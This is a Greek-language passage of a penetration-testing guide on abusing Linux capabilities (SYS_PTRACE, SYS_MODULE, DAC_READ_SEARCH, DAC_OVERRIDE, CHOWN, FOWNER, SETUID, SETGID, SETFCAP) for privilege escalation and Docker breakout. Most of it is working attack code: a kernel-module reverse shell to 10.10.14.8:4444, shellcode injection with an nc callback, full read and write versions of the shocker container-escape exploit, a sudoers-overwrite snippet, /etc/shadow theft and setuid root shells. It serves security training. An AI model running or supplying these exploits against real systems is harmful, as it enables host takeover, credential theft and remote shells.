Δεν θα μπορείτε να δείτε την έξοδο της εντολής που εκτελέστηκε, αλλά θα εκτελεστεί από εκείνη τη διεργασία (οπότε πάρτε ένα rev shell).

> [!WARNING]
> Αν λάβετε το σφάλμα "No symbol "system" in current context." ελέγξτε το προηγούμενο παράδειγμα φόρτωσης ενός shellcode σε ένα πρόγραμμα μέσω του gdb.

**Παράδειγμα με περιβάλλον (Docker breakout) - Shellcode Injection**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Λίστα με τις **διεργασίες** που εκτελούνται στο **host** `ps -eaf`

1. Λάβετε την **αρχιτεκτονική** `uname -m`
2. Βρείτε ένα **shellcode** για την αρχιτεκτονική ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Βρείτε ένα **πρόγραμμα** για να κάνετε **inject** το **shellcode** στη μνήμη μιας διεργασίας ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Τροποποιήστε** το **shellcode** μέσα στο πρόγραμμα και κάντε **compile** `gcc inject.c -o inject`
5. Κάντε **inject** και αποκτήστε το **shell** σας: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

Το **[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** επιτρέπει σε μια διεργασία να **φορτώνει και να αφαιρεί kernel modules (`init_module(2)`, `finit_module(2)` και `delete_module(2)` system calls)**, προσφέροντας άμεση πρόσβαση στις βασικές λειτουργίες του kernel. Αυτή η δυνατότητα παρουσιάζει κρίσιμους κινδύνους ασφαλείας, επειδή η φόρτωση ενός module μπορεί να τροποποιήσει τη συμπεριφορά του kernel και ενδέχεται να παρακάμψει τα όρια απομόνωσης.<sup>[[6]](#references)[[14]](#references)</sup>
**Αυτό επιτρέπει την εισαγωγή ή την αφαίρεση modules στον kernel που είναι ορατός στη διεργασία· σε ένα container, το αν πρόκειται για τον kernel του host εξαρτάται από τη διαμόρφωση απομόνωσης**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Στο ακόλουθο παράδειγμα, το binary **`python`** διαθέτει αυτήν τη δυνατότητα.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Από προεπιλογή, η εντολή **`modprobe`** ελέγχει για αρχεία λίστας εξαρτήσεων και αντιστοίχισης στον κατάλογο **`/lib/modules/$(uname -r)`**.\
Για να το εκμεταλλευτούμε, ας δημιουργήσουμε έναν πλαστό φάκελο **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Στη συνέχεια, **κάντε compile το kernel module που μπορείτε να βρείτε στα 2 παραδείγματα παρακάτω και αντιγράψτε** το σε αυτόν τον φάκελο:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Τέλος, εκτελέστε τον απαραίτητο κώδικα Python για να φορτώσετε αυτό το kernel module:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Παράδειγμα 2 με binary**

Στο ακόλουθο παράδειγμα το binary **`kmod`** διαθέτει αυτή τη δυνατότητα.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Πράγμα που σημαίνει ότι είναι δυνατή η χρήση της εντολής **`insmod`** για την εισαγωγή ενός kernel module. Ακολουθήστε το παρακάτω παράδειγμα για να αποκτήσετε ένα **reverse shell** εκμεταλλευόμενοι αυτό το privilege.

**Παράδειγμα με environment (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Μέσα στο προηγούμενο output μπορείτε να δείτε ότι η capability **SYS_MODULE** είναι ενεργοποιημένη.<sup>[[14]](#references)</sup>

**Δημιουργήστε** το **kernel module** που θα εκτελέσει ένα **reverse shell** και το **Makefile** για να το **compile**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Ο κενός χαρακτήρας πριν από κάθε λέξη `make` στο Makefile **πρέπει να είναι tab και όχι κενά**!

Εκτελέστε το `make` για να το μεταγλωττίσετε.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Τέλος, εκκινήστε το `nc` μέσα σε ένα shell και **φορτώστε το module** από ένα άλλο· έτσι θα αποκτήσετε το shell στη διεργασία nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing SYS_MODULE Capability" του** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Ένα ακόμη παράδειγμα αυτής της τεχνικής υπάρχει στο [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει σε μια διεργασία να **παρακάμπτει τα permissions για την ανάγνωση αρχείων και για την ανάγνωση και εκτέλεση directories**. Η κύρια χρήση του είναι για αναζήτηση ή ανάγνωση αρχείων. Ωστόσο, επιτρέπει επίσης σε μια διεργασία να χρησιμοποιεί τη συνάρτηση `open_by_handle_at(2)`, η οποία μπορεί να έχει πρόσβαση σε οποιοδήποτε αρχείο, συμπεριλαμβανομένων εκείνων που βρίσκονται εκτός του mount namespace της διεργασίας. Το handle που χρησιμοποιείται στο `open_by_handle_at(2)` υποτίθεται ότι είναι ένα non-transparent identifier που λαμβάνεται μέσω της `name_to_handle_at(2)`, αλλά μπορεί να περιλαμβάνει ευαίσθητες πληροφορίες, όπως inode numbers, οι οποίες είναι ευάλωτες σε tampering. Η δυνατότητα εκμετάλλευσης αυτού του capability, ιδιαίτερα στο πλαίσιο Docker containers, καταδείχθηκε από τον Sebastian Krahmer με το shocker exploit, όπως αναλύεται [εδώ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
**Αυτό σημαίνει ότι μπορείτε να παρακάμπτετε τους ελέγχους permissions για την ανάγνωση αρχείων και τους ελέγχους permissions για την ανάγνωση/εκτέλεση directories**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Το binary μπορεί να διαβάζει αρχεία που είναι προσβάσιμα στα namespaces του. Επομένως, αν ένα αρχείο όπως το `tar` διαθέτει αυτό το capability, μπορεί να διαβάσει το shadow file:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Παράδειγμα με binary2**

Σε αυτήν την περίπτωση, ας υποθέσουμε ότι το **`python`** binary διαθέτει αυτήν την capability. Για να εμφανίσετε αρχεία root, μπορείτε να εκτελέσετε:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Και για να διαβάσετε ένα αρχείο θα μπορούσατε να κάνετε:
```python
print(open("/etc/shadow", "r").read())
```
**Παράδειγμα σε Environment (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο Docker container χρησιμοποιώντας το `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Στην προηγούμενη έξοδο μπορείτε να δείτε ότι η capability **DAC_READ_SEARCH** είναι ενεργοποιημένη. Παρακάμπτει τους ελέγχους ανάγνωσης/αναζήτησης DAC και επιτρέπει την `open_by_handle_at(2)`· από μόνη της δεν είναι capability αποσφαλμάτωσης διεργασιών.<sup>[[14]](#references)</sup>

Μπορείτε να μάθετε πώς λειτουργεί το παρακάτω exploit στο [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), αλλά συνοπτικά, η **CAP_DAC_READ_SEARCH** επιτρέπει την περιήγηση στο file system χωρίς ελέγχους δικαιωμάτων και επιτρέπει την `open_by_handle_at(2)`· αυτό μπορεί να εκθέσει αρχεία που έχουν ανοίξει άλλες διεργασίες, όταν τα σχετικά namespaces και mounts είναι προσβάσιμα.<sup>[[13]](#references)[[14]](#references)</sup>

Το αρχικό exploit που καταχράται αυτά τα δικαιώματα για την ανάγνωση αρχείων από το host βρίσκεται εδώ: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)· το παρακάτω είναι μια **τροποποιημένη έκδοση που σας επιτρέπει να περάσετε το αρχείο προς ανάγνωση ως πρώτο όρισμα και να αποθηκεύσετε το αποτέλεσμα σε αρχείο**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Το exploit πρέπει να βρει έναν pointer σε κάτι που έχει γίνει mount στο host. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit, ενώ αυτή η τροποποιημένη έκδοση χρησιμοποιεί το /etc/hostname. Αν το exploit δεν λειτουργεί, ίσως χρειάζεται να ορίσετε διαφορετικό αρχείο. Για να βρείτε ένα αρχείο που έχει γίνει mount στο host, απλώς εκτελέστε την εντολή mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Το exploit πρέπει να βρει έναν pointer σε κάτι που έχει γίνει mount στο host. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit, ενώ αυτή η τροποποιημένη έκδοση χρησιμοποιεί...](<../../images/image (407) (1).png>)

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC_READ_SEARCH Capability" του** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Αυτή η capability παρακάμπτει τους ελέγχους δικαιωμάτων ανάγνωσης, εγγραφής και εκτέλεσης αρχείων**.<sup>[[14]](#references)</sup>

Αναζητήστε αρχεία που γίνονται αναγνώσιμα ή εγγράψιμα μέσω συμμετοχής σε privileged group· οι χρήσιμοι στόχοι εξαρτώνται από την ιδιοκτησία και τα mode bits του target.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Σε αυτό το παράδειγμα, το vim έχει αυτή την capability, επομένως μπορείτε να τροποποιήσετε οποιοδήποτε αρχείο, όπως τα _passwd_, _sudoers_ ή _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Παράδειγμα με binary 2**

Σε αυτό το παράδειγμα, το **`python`** binary θα έχει αυτήν τη δυνατότητα. Θα μπορούσατε να χρησιμοποιήσετε το python για να παρακάμψετε οποιοδήποτε αρχείο:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Example with environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Επιβεβαιώστε το `CAP_DAC_OVERRIDE` με το `capsh --print`, όπως παρουσιάζεται στο προηγούμενο παράδειγμα environment για το `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

Πρώτα απ’ όλα, διαβάστε την προηγούμενη ενότητα που [**καταχράται τη δυνατότητα DAC_READ_SEARCH για την ανάγνωση αυθαίρετων αρχείων**](linux-capabilities.md#cap_dac_read_search) του host και **κάντε compile** το exploit.\
Στη συνέχεια, **κάντε compile την ακόλουθη έκδοση του shocker exploit**, η οποία θα σας επιτρέψει να **γράψετε αυθαίρετα αρχεία** μέσα στο filesystem του host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Για να **διαφύγετε από το docker container**, θα μπορούσατε να **κατεβάσετε** τα αρχεία `/etc/shadow` και `/etc/passwd` από το host, να **προσθέσετε** σε αυτά έναν **νέο χρήστη** και να χρησιμοποιήσετε το **`shocker_write`** για να τα αντικαταστήσετε. Στη συνέχεια, να **αποκτήσετε πρόσβαση** μέσω **ssh**.

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC_OVERRIDE Capability" του** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Αυτή η capability επιτρέπει σε μια διεργασία να αλλάξει την ιδιοκτησία αρχείων**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **`python`** binary διαθέτει αυτήν την capability· μπορείτε να αλλάξετε τον ιδιοκτήτη ενός αρχείου, όπως το **`shadow`**, και στη συνέχεια να χρησιμοποιήσετε την πρόσβαση που προκύπτει για να το τροποποιήσετε, εφόσον το επιτρέπουν τα υπόλοιπα permissions:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ή με το δυαδικό αρχείο **`ruby`** που διαθέτει αυτή τη δυνατότητα:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Αυτή η capability παρακάμπτει τους ελέγχους ιδιοκτησίας για πολλές λειτουργίες αρχείων, συμπεριλαμβανομένης της αλλαγής permissions**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν το python έχει αυτή την capability, μπορείτε να τροποποιήσετε τα permissions του shadow file, **να αλλάξετε το root password** και να κάνετε privilege escalation:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Αυτή η capability επιτρέπει σε μια διεργασία να αλλάξει το effective user ID της, με την επιφύλαξη των κανόνων credentials και capabilities που επιβάλλονται από τον kernel**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν το python διαθέτει αυτή την **capability**, μπορείς πολύ εύκολα να την εκμεταλλευτείς για να κάνεις privilege escalation σε root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Ένας άλλος τρόπος:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Αυτή η capability επιτρέπει σε ένα process να αλλάξει το effective group ID του, με την επιφύλαξη των κανόνων credential και capability που επιβάλλονται από το kernel**.<sup>[[14]](#references)</sup>

Υπάρχουν πολλά αρχεία που μπορείτε να **αντικαταστήσετε για να κάνετε privilege escalation,** [**μπορείτε να πάρετε ιδέες από εδώ**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Παράδειγμα με binary**

Σε αυτήν την περίπτωση, θα πρέπει να αναζητήσετε ενδιαφέροντα αρχεία που μπορεί να διαβάσει μια ομάδα, επειδή μπορείτε να υποδυθείτε οποιαδήποτε ομάδα:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Αφού βρείτε ένα αρχείο που μπορείτε να εκμεταλλευτείτε (μέσω ανάγνωσης ή εγγραφής) για την κλιμάκωση προνομίων, μπορείτε να **αποκτήσετε ένα shell που υποδύεται το ενδιαφέρον group** με:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Σε αυτήν την περίπτωση έγινε impersonation της ομάδας shadow, επομένως μπορείτε να διαβάσετε το αρχείο `/etc/shadow`:
```bash
cat /etc/shadow
```
### Συνδυαστική αλυσίδα: CAP_SETGID + CAP_CHOWN

Όταν και οι δύο capabilities είναι διαθέσιμες στο ίδιο helper, μια πρακτική αλυσίδα είναι:

1. Αλλάξτε το EGID σε `shadow` (ή σε άλλη privileged group).
2. Χρησιμοποιήστε το `chown` στο `/etc/shadow` για να ορίσετε το UID σας, διατηρώντας την ομάδα `shadow`.
3. Διαβάστε ένα target hash και κάντε crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Αυτό αποφεύγει την ανάγκη για άμεσο πλήρες root και συνήθως αρκεί για pivot μέσω credential reuse.

Αν έχει εγκατασταθεί το **docker**, θα μπορούσες να **impersonate** το **docker group** και να το εκμεταλλευτείς για επικοινωνία με το [**docker socket** και κλιμάκωση προνομίων](#writable-docker-socket).

## CAP_SETFCAP

**Αυτή η capability επιτρέπει σε μια διεργασία να ορίζει file capabilities**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν η python διαθέτει αυτή την **capability**, μπορείς πολύ εύκολα να την εκμεταλλευτείς για κλιμάκωση προνομίων σε root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Ένα νεοεγγραμμένο capability set αντικαθιστά το προηγούμενο set· αν το helper εκτελεστεί στη συνέχεια μόνο με τα νέα capabilities, ενδέχεται να μην διατηρεί πλέον το `CAP_SETFCAP` για την ενημέρωση ενός άλλου αρχείου.<sup>[[14]](#references)[[25]](#references)</sup>

Μόλις αποκτήσετε [SETUID capability](linux-capabilities.md#cap_setuid), μπορείτε να μεταβείτε στην ενότητα για να δείτε πώς να κάνετε privilege escalation.

**Παράδειγμα με environment (Docker breakout)**

Το τεκμηριωμένο προεπιλεγμένο capability set του Docker περιλαμβάνει το **CAP_SETFCAP**, αλλά το πραγματικό set εξαρτάται από τη ρύθμιση του runtime.<sup>[[19]](#references)</sup>
Μπορείτε να επιθεωρήσετε τα capabilities της διεργασίας με:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Αυτή η capability επιτρέπει την εγγραφή file capabilities, αλλά από μόνη της δεν εκχωρεί αυτές τις capabilities στην τρέχουσα διεργασία ούτε παρακάμπτει τους κανόνες του file, του bounding-set και του namespace που εφαρμόζονται κατά την εκτέλεση του file.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
